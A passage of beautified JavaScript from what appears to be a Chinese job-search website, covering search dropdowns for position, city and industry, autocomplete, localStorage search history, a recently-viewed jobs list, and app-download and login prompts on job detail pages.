                    var n = '<div class="position-select-dropdown__item"><span class="position-select-dropdown__title">' + (t.name || "") + '</span><div class="position-select-dropdown__child"><div class="position-select-dropdown__main"><span class="position-select-title">' + (t.name || "") + "</span>";
                    $.each(t.subLevelModelList || [], function(e, t) {
                        var i = '<div class="position-select-dropdown__grandson"><span class="position-select-dropdown__label">' + (t.name || "") + '</span><div class="position-select-dropdown__list">';
                        $.each(t.subLevelModelList || [], function(e, t) {
                            i += '<a href="javascript:;" ka="position_grandson_click_' + (t.code || "") + '" data-code="' + (t.code || "") + '">' + (t.name || "") + "</a>"
                        }),
                        n += i += "</div></div>"
                    }),
                    i += n += "</div></div></div>"
                }),
                i += "</div></div>",
                Search.positionElement && Search.positionElement.remove(),
                Search.positionElement = $(i).appendTo(t),
                Search.positionElement.on("mouseleave", function() {
                    $(this).find(".position-select-dropdown__child").hide()
                }),
                Search.positionElement.on("mouseenter", ".position-select-dropdown__item", function(e) {
                    $(this).siblings().children(".position-select-dropdown__child").hide(),
                    $(this).children(".position-select-dropdown__child").show()
                }),
                Search.positionElement.on("click", ".position-select-dropdown__list a", function() {
                    var e = $(this).closest("form");
                    e.find("input[name=position]").val($(this).data("code")),
                    e.submit()
                }))
            })
        }),
        Search.searchBox.find(".btn-search", function() {
            try {
                var e = $("#page_key_name").val() || "";
                _T.sendEvent("pc-search-click", e, "4")
            } catch (e) {}
        }),
        Search.searchBox.find("form").on("submit", function(e) {
            var i, t = $(this).find(".ipt-search"), n = t.val().replace(/\</g, "&lt;").replace(/\>/g, "&gt;");
            "搜索职位、公司" == n && t.val(""),
            "" != n && function() {
                var t = !0;
                try {
                    t = !!window.localStorage
                } catch (e) {
                    t = !1
                }
                return t
            }() && ((t = Storage.get("_Search_History")) ? -1 === t.indexOf(n) ? (t.unshift(n),
            Storage.set("_Search_History", t)) : (i = [],
            $(t).each(function(e, t) {
                10 <= e || t != n && i.push(t)
            }),
            i.unshift(n),
            Storage.set("_Search_History", i)) : Storage.set("_Search_History", [n]))
        }),
        $(document).on("click", function(e) {
            $(e.target).closest(".city-sel").length || $(e.target).closest(".dorpdown-province").length || (Search.searchBox.removeClass("show-city"),
            $("#header .nav-city").length && !$(e.target).closest(".nav-city-box").length && $("#header .nav-city").removeClass("show-city")),
            $(e.target).closest(".position-sel").length || $(e.target).closest(".position-box").length || Search.searchBox.removeClass("show-position"),
            $(e.target).closest(".industry-sel").length || Search.searchBox.removeClass("show-industry"),
            $(e.target).closest(".suggest-result").length || $(e.target).closest(".ipt-search").length || Search.searchBox.find(".suggest-result").hide(),
            $(e.target).closest(".search-find-box").length || $(e.target).closest(".ipt-search").length || Search.searchBox.find(".search-find-box").hide(),
            $(e.target).closest(".city-sel").length || Search.searchBox.find(".dropdown-city-menu").hide()
        }),
        Search.searchBox.find(".industry-box").on("click", " li a", function(e) {
            return "不限" == $(this).text() ? Search.searchBox.find(".industry-sel").find(".label-text b").text("行业不限") : Search.searchBox.find(".industry-sel").find(".label-text b").text($(this).text()),
            Search.searchBox.find(".industry-code").val($(this).parent().attr("data-val")),
            Search.searchBox.find(".industry-box ul .cur").removeClass("cur"),
            $(this).parent().addClass("cur"),
            e.preventDefault(),
            Search.searchBox.toggleClass("show-industry"),
            !1
        }),
        Search.searchBox.find(".ipt-search").on("paste keyup", function(e) {
            var t;
            13 != e.which && 27 != e.which && 38 != e.which && 40 != e.which && (Search.suggestTimer && clearTimeout(Search.suggestTimer),
            t = $(this),
            Search.suggestTimer = setTimeout(function() {
                Search.suggest(t)
            }, 200))
        }),
        Search.searchBox.find(".ipt-search").on("focus", function(e) {
            var t;
            $(".geek-inside").length || ((t = $(this).closest(".search-box")).find(".suggest-result li").length ? t.find(".suggest-result").show() : Search.fillHistory($(this).closest(".search-box")))
        }),
        Search.searchBox.find(".ipt-search").focus(function() {
            $(this).closest("form").addClass("search-form-shadow"),
            $(this).closest(".ipt-wrap").addClass("ipt-wrap-hover"),
            $(this).closest("form").find(".city-sel").addClass("city-sel-hover"),
            $(this).closest("form").find(".industry-sel").addClass("industry-sel-hover"),
            $(this).closest("form").find(".position-sel").addClass("position-sel-hover")
        }),
        Search.searchBox.find(".ipt-search").blur(function() {
            $(this).closest("form").removeClass("search-form-shadow"),
            $(this).closest(".ipt-wrap").removeClass("ipt-wrap-hover"),
            $(this).closest("form").find(".city-sel").removeClass("city-sel-hover"),
            $(this).closest("form").find(".industry-sel").removeClass("industry-sel-hover"),
            $(this).closest("form").find(".position-sel").removeClass("position-sel-hover")
        }),
        Search.searchBox.find(".suggest-result").off("click", "li").on("click", "li", function() {
            try {
                var e = $("#page_key_name").val() || "";
                _T.sendEvent("pc-search-click", e, "3")
            } catch (e) {}
            Search.addInput($(this))
        });
        var e, i, n = -1;
        function a() {
            $(".city-dialog .city-wrapper").on("click", ".city-cur", function(e) {
                e = $(e.target).attr("data-val");
                window.location.href = "/c" + e + "/?ka=sel-city-" + e,
                $(".city-dialog.city-letter-show").hide()
            })
        }
        function o() {
            $(".city-dialog .city-wrapper").on("click", ".city-cur", function(e) {
                $(e.target).text();
                e = $(e.target).attr("data-val");
                window.location.href = "/gongsi/_zzz_c" + e + "/",
                $(".city-dialog.city-letter-show").hide()
            })
        }
        Search.searchBox.find(".ipt-search").keydown(function(e) {
            var t = Search.searchBox.find(".suggest-result li");
            switch (e.which) {
            case 38:
                t.removeClass("selected"),
                -1 == n ? (n = -1,
                n = t.length - 1) : n--,
                t.eq(n).addClass("selected"),
                Search.addInput(t.eq(n), !0),
                Search.scrollVisiable(t.eq(n), "up");
                break;
            case 40:
                e.preventDefault(),
                t.removeClass("selected"),
                n > t.length - 2 && (n = -1),
                n++,
                t.eq(n).addClass("selected"),
                Search.addInput(t.eq(n), !0),
                Search.scrollVisiable(t.eq(n), "down");
                break;
            case 13:
                n = -1;
                try {
                    var i = $("#page_key_name").val() || "";
                    _T.sendEvent("pc-search-click", i, "4")
                } catch (e) {}
                break;
            case 27:
                n = -1,
                Search.searchBox.find(".ipt-search").val("")
            }
        }),
        Search.searchBox.length && 0 == $(".company-detail-grab").length && $(".job-list .company-card a").on("click", function() {
            var e = $(this)
              , t = e.closest(".job-list");
            $.ajax({
                type: "POST",
                url: "/wapi/zpCommon/actionLog/search.json",
                dataType: "JSON",
                data: {
                    keyword: t.attr("data-keyword"),
                    l3code: t.attr("data-l3code"),
                    filter: t.attr("data-filter"),
                    rescount: t.attr("data-rescount"),
                    page: t.attr("data-page"),
                    index: e.attr("data-index"),
                    lid: e.attr("data-lid"),
                    itemid: e.attr("data-itemid"),
                    jobid: e.attr("data-jobid"),
                    source: t.attr("data-source")
                }
            })
        }),
        $(".company-card").on("click", function(e) {
            $(e.target).hasClass("btn") || ($(e.target).closest(".company-card").find(".btn").eq(0).click(),
            window.location.href = $(this).find(".btn").eq(0).attr("href"))
        }),
        $(".condition-box .btn-allcity").on("click", function() {
            Search.renderCityDialogNew(a)
        }),
        $(".company-search").length && ($(".select-city-wrapper").html(),
        e = $(".filter-box .expect").offset().top,
        i = $(".top-filter-bar"),
        $(".filter-condition a").on("click", function() {
            $(this).toggleClass("selected")
        }),
        $(".dropdown-wrap").on("mouseenter", function() {
            $(this).addClass("dropdown-menu-open")
        }).on("mouseleave", function() {
            $(this).removeClass("dropdown-menu-open")
        }).on("click", function() {
            $(this).toggleClass("dropdown-menu-open")
        }),
        $(".all-city").on("click", function() {
            Search.renderCityDialogNew(o)
        }),
        $(window).scrollTop() > e && i.addClass("show"),
        $(window).on("scroll", function() {
            $(this).scrollTop() > e ? i.addClass("show") : i.removeClass("show")
        }),
        $(".expect-filter").on("click", function(e) {
            _PAGE.uid || (ShowLoginDialog.showBossLogin({
                params: {
                    pk: $(this).attr("ka") || ""
                }
            }),
            e.preventDefault())
        })),
        Search.searchBox.find(".search-box-login").on("click", function(e) {
            e.preventDefault(),
            ShowLoginDialog.showBossLogin({
                params: {
                    pk: $(this).find("a").attr("ka") || "",
                    eventLog: {
                        p: $(this).find("a").attr("ka") || ""
                    }
                }
            })
        }),
        Search.searchBox.find(".search-box-login .search-box-login-close").on("click", function(e) {
            e.stopPropagation(),
            e.preventDefault(),
            Search.searchBox.find(".search-box-login").remove();
            try {
                $(this).attr("ka") && _T.sendEvent($(this).attr("ka"))
            } catch (e) {}
        })
    },
    loadSubscribeModule: function() {
        var e, t;
        $(".subscribe-wechat-wrapper").length && (e = $(".subscribe-wechat-wrapper"),
        function() {
            var t = !0;
            try {
                t = !!window.localStorage
            } catch (e) {
                t = !1
            }
            return t
        }() ? (t = Storage.get("wechat_subscribe_job")) && ((new Date).getTime() - t) / 36e5 < 24 || Search.showSubScribeModule(e) : (Search.showSubScribeModule(e),
        e.find(".close").attr("title", "")),
        e.find(".close").on("click", function() {
            e.fadeOut("fast"),
            function() {
                var t = !0;
                try {
                    t = !!window.localStorage
                } catch (e) {
                    t = !1
                }
                return t
            }() && Storage.set("wechat_subscribe_job", (new Date).getTime())
        }))
    },
    showSubScribeModule: function(t) {
        $.ajax({
            url: "/wapi/zpgeek/job/subscribe.json",
            type: "GET",
            data: {
                sceneStr: t.find("input[name=sceneStr]").val(),
                filter: decodeURI(t.find("input[name=filter]").val())
            },
            dataType: "json",
            success: function(e) {
                if (0 == e.code) {
                    (t = t || $(".subscribe-wechat-wrapper")).find("img").attr("src", e.zpData.qrUrl),
                    t.fadeIn("fast");
                    try {
                        _T.sendEvent("subscription_pop")
                    } catch (e) {}
                }
            },
            error: function() {}
        })
    },
    fillHistory: function(s) {
        try {
            var e, r;
            !function() {
                var t = !0;
                try {
                    t = !!window.localStorage
                } catch (e) {
                    t = !1
                }
                return t
            }() || (e = Storage.get("_Search_History") || []).length && (r = $(e).map(function(e, t) {
                return t.replace(/\</g, "&lt;").replace(/\>/g, "&gt;")
            }).toArray().slice(0, 10),
            s.find(".search-find-box") && s.find(".search-find-box").remove(),
            $.ajax({
                url: "/wapi/zpgeek/suggest/searchhotword.json",
                type: "get",
                data: {
                    historyQuery: r.join(",")
                },
                success: function(e) {
                    var i, n, a, o = "", t = ($.each(r, function(e, t) {
                        o += '<a href="javascript:;">' + t + "</a>"
                    }),
                    ['<div class="search-find-box">', o ? '<div class="search-find-group history"><span class="search-find-title">历史搜索<a href="javascript:;" class="clear-search-btn" ka="clear_history_word_click">清空历史</a></span><div class="search-find-list">' + o + "</div></div>" : "", "</div>"]);
                    s.guessElement = $(t.join("")).appendTo(s.find("form")),
                    s.on("click", ".search-find-list a", function() {
                        try {
                            var e = $("#page_key_name").val() || ""
                              , t = 0 < $(this).closest(".history").length;
                            _T.sendEvent("pc-search-click", e, t ? "1" : "2")
                        } catch (e) {}
                        e = $(this).closest("form");
                        e.find(".ipt-search").val($(this).text()),
                        $(this).closest(".search-find-box").hide(),
                        e.submit()
                    }),
                    s.on("click", ".clear-search-btn", function() {
                        var e = function() {
                            var t = !0;
                            try {
                                t = !!window.localStorage
                            } catch (e) {
                                t = !1
                            }
                            return t
                        }();
                        try {
                            e && Storage.set("_Search_History", "")
                        } catch (e) {}
                        Search.searchBox.find(".search-find-box").remove()
                    }),
                    t = {},
                    (e = e).zpData && (e.zpData.hotSearchList || []).length && (t = e.zpData.hotSearchList[0] || {}),
                    i = "",
                    $.each(t.dataList || [], function(e, t) {
                        i += '<div class="search-find-list search-find-item' + (0 == e ? " active" : "") + '">';
                        e = t.wordList || [];
                        s.hasClass("nav-search") && (e = e.slice(0, 6)),
                        $.each(e, function(e, t) {
                            i += '<a href="javascript:;" class="' + (1 == t.iconType ? "has-hot-word" : "") + '">' + (t.name || "") + "</a>"
                        }),
                        i += "</div>"
                    }),
                    e = (t.dataList || []).length ? ['<div class="search-find-group"><a href="javascript:;" class="switch-find-btn">换一批</a><span class="search-find-title">' + (t.name || "搜索发现") + "</span>" + i + "</div>"] : [],
                    t = $(e.join("")).appendTo(s.guessElement),
                    n = 0,
                    a = $(".search-find-item", t),
                    t.on("click", ".switch-find-btn", function() {
                        var e, t;
                        ++n > a.length - 1 && (n = 0),
                        a.eq(n).addClass("active").siblings().removeClass("active"),
                        $(this).hasClass("rotate") || ($(this).addClass("rotate"),
                        e = $(this),
                        t = setTimeout(function() {
                            e.removeClass("rotate"),
                            clearTimeout(t)
                        }, 200));
                        try {
                            var i = $("#page_key_name").val() || "";
                            _T.sendEvent("pc-search-change-click", i)
                        } catch (e) {}
                    })
                }
            }))
        } catch (e) {}
    },
    loadIndustryData: function(t) {
        $.ajax({
            type: "GET",
            url: "/wapi/zpCommon/data/industry.json",
            data: {},
            dataType: "json",
            success: function(e) {
                var e = e.zpData || []
                  , n = []
                  , a = [100604, 101103];
                $.each(e, function(e, t) {
                    var i = [];
                    $.each((t || {}).subLevelModelList || [], function(e, t) {
                        -1 < a.indexOf((t || {}).code) || i.push(t)
                    }),
                    n = n.concat(i)
                }),
                t(n)
            }
        })
    },
    renderIndustry: function(e) {
        var i = $(".industry-box").find("ul");
        i.empty(),
        i.append('<li data-val=""><a href="javascript:;">不限</a></li>'),
        $(e).each(function(e, t) {
            i.append('<li data-val="' + t.code + '" ka="sel-industry-' + (e + 1) + '"><a href="javascript:;">' + t.name + "</a></li>")
        })
    },
    loadCityData: function(e) {
        $.ajax({
            type: "GET",
            url: "/wapi/zpCommon/data/city.json",
            data: {},
            dataType: "json",
            success: function(e) {
                Search.cityData = e.zpData
            }
        })
    },
    renderCity: function(e) {
        var t, i;
        $(".dorpdown-province").parents(".geek-inside").length || ($(".dorpdown-province").empty(),
        $(".dorpdown-city").empty(),
        t = e.hotCityList,
        e = e.cityList,
        $(".dorpdown-province").append('<li class="">热门</li>'),
        i = $("<ul></ul>"),
        $(t).each(function(e, t) {
            $(i).append('<li ka="hot-city-' + t.code + '" data-val="' + t.code + '" class="cur">' + t.name + "</li>")
        }),
        $(".dorpdown-city").append(i),
        $(e).each(function(e, t) {
            $(".dorpdown-province").append('<li ka="sel-province-' + (e + 1) + '" class="">' + t.name + "</li>");
            var i = $("<ul></ul>")
              , e = t.subLevelModelList;
            $(e).each(function(e, t) {
                $(i).append('<li ka="hot-city-' + t.code + '" data-val="' + t.code + '" class="cur">' + t.name + "</li>")
            }),
            $(".dorpdown-city").append(i)
        }))
    },
    loadPositionData: function(t) {
        $.ajax({
            type: "GET",
            url: "/wapi/zpCommon/data/position.json",
            data: {},
            dataType: "json",
            success: function(e) {
                "function" == typeof ajaxGetaway && ajaxGetaway(e.code),
                t(e.zpData)
            }
        })
    },
    getTreeData: function(e, t, i, n) {
        for (var a, o, s = "", r = "", c = "", l = 0; l < t.length; l++) {
            var d = t[l].subLevelModelList;
            if (s += '<li data-id="' + t[l].code + '">' + t[l].name + "</li>",
            d && i && t[l].code == i)
                for (a = 0; a < d.length; a++) {
                    var p = d[a].subLevelModelList;
                    if (r += '<li data-id="' + d[a].code + '">' + d[a].name + "</li>",
                    p && n && d[a].code == n)
                        for (o = 0; o < p.length; o++)
                            c += '<li data-val="' + p[o].code + '">' + p[o].name + "</li>"
                }
        }
        i || (e.find(".tree-1").html('<li data-id="0" class="">不限</li>' + s),
        e.find(".tree-2").html('<li class="blank">选择职类</li>')),
        n ? ("" == c ? (e.find(".tree-3").hide(),
        e.find(".tree-3").parent().removeClass("tree-3-show")) : (e.find(".tree-3").show(),
        e.find(".tree-3").parent().addClass("tree-3-show")),
        e.find(".tree-3").html(c)) : i && ("" == r ? (e.find(".tree-2").hide(),
        e.find(".tree-2").parent().removeClass("tree-2-show")) : (e.find(".tree-2").show(),
        e.find(".tree-2").parent().addClass("tree-2-show")),
        e.find(".tree-2").html(r))
    },
    suggest: function(e) {
        var t = (e = e).val().replace(/(^\s*)|(\s*$)/g, "")
          , a = e.closest(".search-box").find(".suggest-result")
          , o = e.closest(".search-box").find(".search-find-box")
          , s = a.find("ul");
        "" == t ? (a.hide(),
        o && o.show()) : $.ajax({
            type: "GET",
            url: "/wapi/zpgeek/autocomplete/query.json",
            dataType: "JSON",
            cache: !1,
            data: {
                query: t
            },
            success: function(e) {
                var t, i, n = "";
                if ((e = e).zpData && e.zpData.data && e.zpData.data.length) {
                    for (t = e.zpData.data,
                    i = 0; i < t.length; i++)
                        n += "<li>" + t[i].hlname + "</li>";
                    s.html(n),
                    a.show(),
                    o && o.hide()
                } else
                    a.hide(),
                    o && o.show();
                Search.isLoading = !1
            },
            error: function(e) {
                Search.isLoading = !1
            }
        })
    },
    hightLight: function(e, t) {
        if ("" == (t = t.replace(/(^\s*)|(\s*$)/g, "")))
            return e;
        var i = t;
        return e.replace(t.toLowerCase(), '<em class="text-blue">' + i + "</em>").replace(t.toUpperCase(), '<em class="text-blue">' + i + "</em>")
    },
    addInput: function(e, t) {
        var i = (e = e).text().replace('<u class="h">', "").replace("</u>", "")
          , e = e.parents("form");
        e.find(".ipt-search").val(i),
        t || (Search.searchBox.find(".suggest-result").hide(),
        e.submit())
    },
    scrollVisiable: function(e, t) {
        var i = Search.searchBox.find(".suggest-result ul");
        if (!e)
            return !1;
        var n = i.find("li").length
          , a = $(e).index()
          , o = 4 < a ? a - 4 : 0
          , s = "down" == t && (o < n - 4 || 0 === a);
        "up" == t && (o = a),
        ("up" == t && (a < n - 5 || a == n - 1) || s) && i.scrollTop(o * $(e).height())
    },
    renderCityDialog: function() {
        var n = []
          , e = (Search.cityData.cityList.forEach(function(e, t) {
            -1 === ["北京", "上海", "天津", "重庆"].indexOf(e.name) && n.push(e)
        }),
        n.unshift({
            name: "热门城市",
            subLevelModelList: Search.cityData.hotCityList
        }),
        n.map(function(e, t) {
            return 0 == t ? "<li>" + e.name + "</li>" : '<li ka="sel-province-' + t + '">' + e.name + "</li>"
        }).join(""));
        $.dialog({
            content: '<h4>请选择城市</h4><div class="city-wrapper"><ul class="section-province">' + e + '</ul><ul class="section-city"></ul>',
            title: "",
            closeText: !0,
            cancelText: "",
            confirmText: "",
            wrapClass: "city-dialog",
            onOpen: function(t) {
                var i = t.find(".section-province li");
                i.on("click", function() {
                    i.removeClass("active"),
                    $(this).addClass("active");
                    var e = n[$(this).index()].subLevelModelList.map(function(e, t) {
                        return '<li><a href="/c' + e.code + '/" ka="sel-city-' + e.code + '">' + e.name + "</a></li>"
                    }).join("");
                    t.find(".section-city").html(e)
                }),
                i.first().click()
            },
            onConfirm: function(e) {}
        })
    },
    renderCityDialogNew: function(o) {
        $.ajax({
            type: "GET",
            url: "/wapi/zpCommon/data/cityGroup.json",
            dataType: "JSON"
        }).success(function(e) {
            if (0 == e.code) {
                var t, a = [], i = e.zpData.cityGroup, n = (a.unshift({
                    name: "热门城市",
                    subLevelModelList: e.zpData.hotCityList
                }),
                {
                    ABCDE: [],
                    FGHJ: [],
                    KLMN: [],
                    PQRST: [],
                    WXYZ: []
                });
                for (t in i.forEach(function(e, t) {
                    /[ABCDE]/g.test(e.firstChar) && n.ABCDE.push(e),
                    /[FGHJ]/g.test(e.firstChar) && n.FGHJ.push(e),
                    /[KLMN]/g.test(e.firstChar) && n.KLMN.push(e),
                    /[PQRST]/g.test(e.firstChar) && n.PQRST.push(e),
                    /[WXYZ]/g.test(e.firstChar) && n.WXYZ.push(e)
                }),
                n)
                    a.push({
                        name: t,
                        subLevelModelList: n[t]
                    });
                e = a.map(function(e, t) {
                    return 0 == t ? "<li>" + e.name + "</li>" : '<li ka="sel-province-' + t + '">' + e.name + "</li>"
                }).join("");
                $.dialog({
                    content: '<h4>请选择城市</h4><div class="city-wrapper"><ul class="section-province">' + e + '</ul><ul class="section-city"><div class="city-title"></div><ul class="city-main"></ul></ul>',
                    title: "",
                    closeText: !0,
                    cancelText: "",
                    confirmText: "",
                    wrapClass: "city-dialog city-letter-show",
                    onOpen: function(e) {
                        var t = e.find(".section-province li");
                        t.on("click", function() {
                            var n;
                            e.find(".section-city").scrollTop(0),
                            t.removeClass("active"),
                            $(this).addClass("active"),
                            "热门城市" == a[$(this).index()].name ? n = a[$(this).index()].subLevelModelList.map(function(e, t) {
                                return '<li class="hot-city"><span class="city-cur"  data-val="' + e.code + '" >' + e.name + "</span></li>"
                            }).join("") : (n = "",
                            a[$(this).index()].subLevelModelList.map(function(e, t) {
                                var i = '<li class="classify-city"><div class="city-title">' + e.firstChar + '</div><ul class="city-main">';
                                e.cityList.forEach(function(e, t) {
                                    i += '<li> <span class="city-cur" data-val="' + e.code + '" >' + e.name + "</span></li>"
                                }),
                                n += i += "</ul></li>"
                            })),
                            e.find(".section-city").html(n)
                        }),
                        t.first().click();
                        try {
                            var i = $("#page_key_name").val() || "";
                            _T.sendEvent("pc-citylist-exp", i)
                        } catch (e) {}
                    },
                    onConfirm: function(e) {}
                }),
                o && o()
            }
        }).error(function(e) {})
    },
    renderCitySelect: function(e) {
        var t = e.find(".dropdown-city-menu");
        t.length ? t.toggle() : Search.cityData ? Search.renderCitySelectDropmenu(e) : Search.loadCityData(Search.renderCitySelectDropmenu)
    },
    renderCitySelectDropmenu: function(n) {
        function t(e) {
            var t = e.secondCode
              , i = (e.name,
            e.thirdName || "");
            n.parents("form").find('input[name="city"]').val(t),
            n.parents("form").find('input[name="area"]').val(i),
            n.parents("form").find(".city-sel .label-text b").text(e.name),
            n.find(".dropdown-city-menu").hide()
        }
        var n = n || Search.searchBox.find(".search-form-con")
          , a = Search.cityData && Search.cityData.cityList
          , o = (a.unshift({
            name: "热门城市",
            subLevelModelList: Search.cityData.hotCityList
        }),
        "")
          , s = ""
          , e = (a.forEach(function(e, i) {
            "热门城市" == e.name && e.subLevelModelList.shift(),
            0 == i ? (o += "<li>" + e.name + "</li>",
            e.subLevelModelList.forEach(function(e, t) {
                s += '<li ka="sel-subLevel-' + i + '">' + e.name + "</li>"
            })) : o += '<li ka="sel-province-' + i + '">' + e.name + "</li>"
        }),
        '<div class="dropdown-menu dropdown-city-menu"><div class="city-box"><ul class="dropdown-province">' + o + '</ul><ul class="dropdown-city">' + s + "</ul>")
          , r = (n.append(e),
        0)
          , c = 0;
        n.find(".dropdown-province li").hover(function() {
            r = $(this).index();
            var i = "";
            a[r].subLevelModelList.forEach(function(e, t) {
                i += '<li ka="sel-subLevel-' + t + '" data-code="' + e.code + '">' + e.name + "</li>"
            }),
            n.find(".dropdown-city").html(i),
            n.find(".city-box").find(".dropdown-third").remove(),
            $(this).addClass("cur").siblings().removeClass("cur")
        }),
        n.on("mouseover", ".dropdown-city li", function() {
            c = $(this).index();
            var i = ""
              , e = a[r].subLevelModelList[c]
              , t = e.subLevelModelList;
            t && t.length ? (t.forEach(function(e, t) {
                3 == e.cityType && (i += '<li ka="sel-subLevel-' + t + '" data-code="' + e.code + '">' + e.name + "</li>")
            }),
            i ? (i = '<li ka="sel-subLevel--1" data-code="' + e.code + '">' + e.name + "</li>" + i,
            n.find(".dropdown-third").length ? n.find(".dropdown-third").html(i) : n.find(".city-box").append('<ul class="dropdown-third">' + i + "</ul>")) : (n.find(".city-box").find(".dropdown-third").remove(),
            $(this).addClass("item-nocity"))) : (n.find(".city-box").find(".dropdown-third").remove(),
            $(this).addClass("item-nocity")),
            $(this).addClass("cur").siblings().removeClass("cur")
        }).on("click", ".dropdown-city li", function() {
            var e;
            $(this).hasClass("item-nocity") && ((e = {}).secondCode = $(this).attr("data-code"),
            e.name = $(this).text(),
            t(e))
        }),
        n.on("click", ".dropdown-third li", function() {
            var e = {};
            e.secondCode = a[r].subLevelModelList[c].code,
            e.name = $(this).text(),
            e.thirdName = 0 == $(this).index() ? "" : $(this).text(),
            t(e)
        })
    }
}
  , Filter = ($(function() {
    Search.init()
}),
{
    init: function() {
        Filter.filterBox = $(".filter-select-box"),
        Filter.filterBox.on("click", "ul li", function() {
            var e = $(this).find(".sub-list");
            e.hasClass("show-sub") ? e.removeClass("show-sub") : (Filter.filterBox.find(".show-sub").removeClass("show-sub"),
            e.addClass("show-sub"))
        }),
        $(document).on("click", function(e) {
            $(e.target).closest(".filter-select-box").length || Filter.filterBox.find(".show-sub").removeClass("show-sub")
        }),
        $(window).on("scroll", function() {
            300 < $(this).scrollTop() ? $("#filter-box").length && ($("#filter-box").addClass("show-top"),
            $(".job-box").addClass("show-top")) : ($("#filter-box").removeClass("show-top"),
            $(".job-box").removeClass("show-top"))
        })
    }
})
  , PositionHistory = ($(function() {
    Filter.init()
}),
{
    init: function() {
        var e, i;
        $(".job-box .sider-list").length && function() {
            var t = !0;
            try {
                t = !!window.localStorage
            } catch (e) {
                t = !1
            }
            return t
        }() && (e = Storage.get("_Job_History")) && (i = [],
        $.each(e, function(e, t) {
            t.storage_expire_time && (new Date).getTime() > t.storage_expire_time || t.job_id && i.push(t.job_id)
        }),
        $.ajax({
            type: "post",
            url: "/wapi/zpgeek/history/joblist.json",
            data: {
                jobIds: i.join(",")
            },
            success: function(e) {
                0 == e.code && e.zpData && PositionHistory.renderList(e.zpData.jobList || [])
            }
        }))
    },
    renderList: function(e) {
        var n;
        $(".job-box").find(".nomargin").html(this.showPersonalityText()),
        0 !== e.length && (n = $(".job-box .sider-list").first(),
        $(e).each(function(e, t) {
            var i;
            4 < e || (i = $.map([t.cityName || "", t.districtName || ""], function(e) {
                return e || null
            }).join("·"),
            $("ul", n).append('<li>\n    <a href="/job_detail/' + t.encryptJobId + ".html?securityId=" + t.securityId + '" ka="viewed_list_' + (e + 1) + '">\n        <div class="history-job-top"><h4>' + t.jobName + '</h4><span class="job-salary">' + t.jobSalary + '</span></div>\n        <div class="history-job-bottom"><span class="company-name">' + t.brandName + '</span><span class="company-position">' + i + "</span></div>\n    </a>\n</li>"))
        }),
        $(n).show(),
        $(".job-box .seen-list").show())
    },
    showPersonalityText: function() {
        return testHtml = '<ul class="resume-refresh"> <li class="refresh-test"><h4>五维职业性格测评</h4><i class="refresh-test-img"></i><p>专业分析职场优势</p><a class="btn refresh-btn" target="_blank" href="/activity/personality/index.html?ka=rcmd-list-personality">立即测试</a></li></ul>'
    }
})
  , Detail = ($(function() {
    PositionHistory.init()
}),
{
    isShowSign: !1,
    hoverTimer: null,
    hasSidFlowMask: !1,
    init: function(wrap) {
        var _this_ = this
          , linkLabel = (Detail.firstIn = !0,
        $(".links").css("height", "70px"),
        $(".links label").each(function() {
            var e = $(this).closest(".links")
              , t = !1
              , i = e.hasClass("links-friends");
            $(this).click(function() {
                t ? (i ? e.css("height", "30px") : e.css("height", "70px"),
                t = !1,
                $(this).html('<span>展开</span><i class="fz fz-slidedown"></i>')) : (e.css("height", "auto"),
                t = !0,
                $(this).html('<span>收起</span><i class="fz fz-slideup"></i>'))
            })
        }),
        $(document).on("click", "#main .info .job-detail-guide-immediate-login", function() {
            try {
                _T.sendEvent($(this).attr("ka") || "")
            } catch (e) {}
            ShowLoginDialog.showBossLogin({
                params: {
                    pk: $(this).attr("ka") || "",
                    eventLog: {
                        p: $(this).attr("ka") || ""
                    }
                }
            })
        }),
        $(".job-detail-guide-download-app-v62")[0] || $(document.body).append('<div class="job-detail-guide-download-app-v62" style="display:none"><div class="app-icon-arrow"></div><div class="app-icon-v62"></div></div>'),
        $(document).on("mouseenter", "#main .info .job-detail-guide-download-app", function() {
            var e = $(this)[0].getBoundingClientRect().left
              , t = $(this)[0].getBoundingClientRect().top;
            document.querySelector(".job-detail-guide-download-app-v62").style.display = "block",
            $(this).hasClass("bottom") ? (document.querySelector(".job-detail-guide-download-app-v62").style.top = t - 172 + "px",
            $(".job-detail-guide-download-app-v62").addClass("bottom")) : (document.querySelector(".job-detail-guide-download-app-v62").style.top = t - 20 + 50 + "px",
            $(".job-detail-guide-download-app-v62").removeClass("bottom")),
            document.querySelector(".job-detail-guide-download-app-v62").style.left = e + 24 - 90 + "px",
            _this_.hoverTimer && clearTimeout(_this_.hoverTimer),
            _this_.hoverTimer = setTimeout(function() {
                try {
                    var e = window.location.href;
                    _T.sendEvent("sanwu_downloadapp", "0", e.split("/job_detail/")[1].split(".html")[0])
                } catch (e) {}
            }, 2e3)
        }),
        $(document).on("mouseleave", "#main .info .job-detail-guide-download-app", function() {
            document.querySelector(".job-detail-guide-download-app-v62").style.display = "none"
        }),
        $(".company-detail-guide-download-app-v62")[0] || $(document.body).append('<div class="company-detail-guide-download-app-v62" style="display:none"><div class="app-icon-arrow"></div><div class="app-icon-v62"></div><div class="app-icon-des-v62">下载App  查看更多</div></div>'),
        $(document).on("mouseenter", "#main .company-name .company-guide-loaddown-app", function() {
            var t = $(this)
              , e = $(this)[0].getBoundingClientRect().left
              , i = $(this)[0].getBoundingClientRect().top;
            document.querySelector(".company-detail-guide-download-app-v62").style.display = "block",
            document.querySelector(".company-detail-guide-download-app-v62").style.top = i - 20 + 3 + "px",
            document.querySelector(".company-detail-guide-download-app-v62").style.left = e + 24 - 76 - 19 + 90 + "px",
            _this_.hoverTimer && clearTimeout(_this_.hoverTimer),
            _this_.hoverTimer = setTimeout(function() {
                try {
                    var e = t.prev().attr("href");
                    _T.sendEvent("sanwu_downloadapp", "1", e.split("/gongsi/")[1].split(".html")[0])
                } catch (e) {}
            }, 2e3)
        }),
        $(document).on("mouseleave", "#main .company-name .company-guide-loaddown-app", function() {
            document.querySelector(".company-detail-guide-download-app-v62").style.display = "none"
        }),
        $(".links-friends").css("height", "27px"),
        $(".links-friends label"))
          , linkWid = 0
          , linkConWid = $(".links-friends dd").width()
          , tagContainer = ($(".links-friends a").each(function() {
            linkWid += $(this).width() + 26
        }),
        linkConWid < linkWid ? linkLabel.show() : linkLabel.hide(),
        $(".btn-signup").on("click", function() {
            ShowLoginDialog.showBossLogin({
                params: {
                    pk: $(this).attr("ka") || ""
                }
            })
        }),
        $(".fold-text .more-view").each(function() {
            var e, t = $(this).closest(".job-sec"), i = $(this).closest(".fold-text");
            t && 0 != t.length && (t.height(t.height()).css("overflow", "hidden"),
            e = i.height(),
            i.css({
                maxHeight: "none",
                overflow: "visible"
            }),
